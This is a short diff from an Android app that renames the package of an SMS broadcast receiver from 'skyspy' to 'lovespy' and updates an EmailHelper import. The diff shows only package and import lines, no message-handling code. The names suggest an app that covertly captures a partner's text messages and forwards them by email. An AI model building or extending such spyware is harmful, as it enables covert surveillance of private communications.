@@ -1,4 +1,4 @@
-package com.example.skyspy.app.sms;
+package com.example.lovespy.app.sms;
 
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -7,7 +7,7 @@ import android.os.AsyncTask;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
 
-import com.example.skyspy.app.email.EmailHelper;
+import com.example.lovespy.app.email.EmailHelper;
 
 public class SmsReceivedListener extends BroadcastReceiver {
 
